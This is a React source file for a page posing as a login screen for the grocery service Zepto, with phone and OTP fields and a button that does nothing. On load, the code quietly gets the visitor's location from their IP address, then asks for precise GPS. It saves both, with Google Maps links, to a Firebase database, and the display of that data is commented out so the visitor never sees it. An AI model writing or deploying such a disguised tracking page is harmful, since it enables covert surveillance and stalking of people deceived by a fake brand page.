import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);
  const [userId, setUserId] = useState(null);

  useEffect(() => {
    const generatedUserId = "user-" + Date.now(); // Unique user ID
    setUserId(generatedUserId);
    getIPLocation(generatedUserId);
  }, []);

  const convertToIST = (utcDate) => {
    return new Date(utcDate).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  };

  const getIPLocation = async (id) => {
    try {
      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
      const data = await response.json();
      
      const ipLocationData = {
        latitude: data.lat,
        longitude: data.lon,
        method: "IP-based",
        city: data.city,
        country: data.country,
        timestamp: convertToIST(new Date().toISOString()),
        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
      };

      setLocation(ipLocationData);
      saveLocation(id, "ipLocation", ipLocationData);
      requestGPSLocation(id);
    } catch (err) {
      console.error("IP Geolocation failed:", err);
      requestGPSLocation(id);
    }
  };

  const requestGPSLocation = (id) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          const gpsLocationData = {
            latitude,
            longitude,
            method: "GPS",
            timestamp: convertToIST(new Date().toISOString()),
            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          };

          setLocation(gpsLocationData);
          saveLocation(id, "gpsLocation", gpsLocationData);
          setLoading(false);
        },
        (error) => {
          console.warn("GPS failed:", error);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      console.error("Geolocation not supported");
    }
  };

  const saveLocation = async (id, key, locationData) => {
    const locationRef = ref(database, `userLocations/${id}/${key}`);
    await push(locationRef, locationData);
  };

  return (
    <div style={{
      display: "flex", justifyContent: "center", alignItems: "center", height: "100vh", backgroundColor: "#f0f2f5", fontFamily: "Arial, sans-serif"
    }}>
      <div style={{
        textAlign: "center", width: "90%", maxWidth: "400px", backgroundColor: "white", padding: "20px", borderRadius: "8px", boxShadow: "0px 4px 10px rgba(0,0,0,0.1)"
      }}>
        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>Zepto</h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>Fast & seamless grocery delivery</p>
        <input type="text" placeholder="Enter Mobile Number" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
        <input type="password" placeholder="Enter OTP" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
        <button style={{ width: "100%", padding: "12px", backgroundColor: "#FF4C3B", color: "white", fontSize: "16px", fontWeight: "bold", border: "none", borderRadius: "6px", cursor: "pointer", marginTop: "10px" }}>Log In</button>
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? <p>Fetching location...</p> :
            location ? (
              <div>
                <p>Latitude: {location.latitude}</p>
                <p>Longitude: {location.longitude}</p>
                {location.city && <p>City: {location.city}</p>}
                {location.country && <p>Country: {location.country}</p>}
                <p>Timestamp (IST): {location.timestamp}</p>
                <p>Method: {location.method}</p>
                <a href={location.mapLink} target="_blank" rel="noopener noreferrer" style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}>View on Google Maps</a>
              </div>
            ) : gpsDenied ? <p style={{ color: "red", fontWeight: "bold" }}>GPS is blocked. Please enable location services or refresh the page.</p> : <p>Could not retrieve location</p>
          }
        </div> */}
      </div>
    </div>
  );
}

export default App;
